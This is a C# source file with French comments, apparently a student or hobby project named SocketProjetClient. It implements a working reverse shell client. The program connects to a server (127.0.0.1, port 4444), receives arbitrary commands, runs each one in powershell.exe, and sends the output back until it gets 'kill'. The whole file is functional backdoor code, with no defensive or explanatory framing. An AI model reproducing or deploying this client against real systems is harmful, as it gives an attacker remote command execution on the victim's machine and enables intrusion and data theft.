using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;

namespace SocketProjetClient
{
    class Program
    {
        public static int Main(string[] args)
        {

            StartClient();
            return 0;

        }

        private static void StartClient()
        {
            byte[] bytes = new byte[1024];

            try
            {
                //Connection au serveur a distance
                string ip_server = "127.0.0.1";
                int port_server = 4444;

                IPHostEntry host = Dns.GetHostEntry(ip_server);
                IPAddress ipAddress = host.AddressList[0];
                IPEndPoint remoteEP = new IPEndPoint(ipAddress, port_server);

                //Creation du socket TCP
                Socket envoie = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                //Connection au serveur distant
                envoie.Connect(remoteEP); //Connection au server
                Console.WriteLine("Connecter a {0}", envoie.RemoteEndPoint.ToString());

                try
                {
                    while (true)
                    {


                        //Recoie la donnee du serveur 
                        //La commande cmd qui sera execute
                        int octetRecue = envoie.Receive(bytes);
                        string cmd_exec = Encoding.ASCII.GetString(bytes, 0, octetRecue);//cmd_exec contiendra la commande a executer
                        Console.WriteLine(cmd_exec);

                        if (cmd_exec == "kill")//Si la commande kill est envoye le programme stop
                        {
                            //
                            //Envoie kill au serveur pour fermer la connection, puis ferme la connection
                            //

                            byte[] message = Encoding.ASCII.GetBytes("kill");

                            //Envoie la donne dans le socket
                            int octetEnvoie = envoie.Send(message);

                            //Fermeture du socket
                            envoie.Shutdown(SocketShutdown.Both);
                            envoie.Close();
                            break;
                        }
                        else
                        {

                            //La variable res_command a le resultat de la commande cmd
                            string res_command = null;
                            res_command = cmd_command(cmd_exec);
                            Console.WriteLine(res_command);

                            //Encode la donne dans un tableau en octet
                            byte[] message = Encoding.ASCII.GetBytes(res_command);

                            //Envoie la donne dans le socket
                            int octetEnvoie = envoie.Send(message);


                        }
                    }


                }

                catch (ArgumentNullException ane)
                {
                    Console.WriteLine("ArgumentNullException : {0}", ane.ToString());
                }

                catch (SocketException se)
                {
                    Console.WriteLine("SocketException : {0}", se.ToString());
                }
                catch (Exception e)
                {
                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }


        private static string cmd_command(string cmd_exec)
        {
            //Demarrage du process CMD
            Process cmd = new Process();
            cmd.StartInfo.FileName = "powershell.exe";
            cmd.StartInfo.Arguments = cmd_exec;
            cmd.StartInfo.UseShellExecute = false;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.Start();


            StreamReader reader = cmd.StandardOutput;
            string output = reader.ReadToEnd();
            cmd.WaitForExit();
            //Envoie le resultat de la commande
            return output;


        }
    }
}
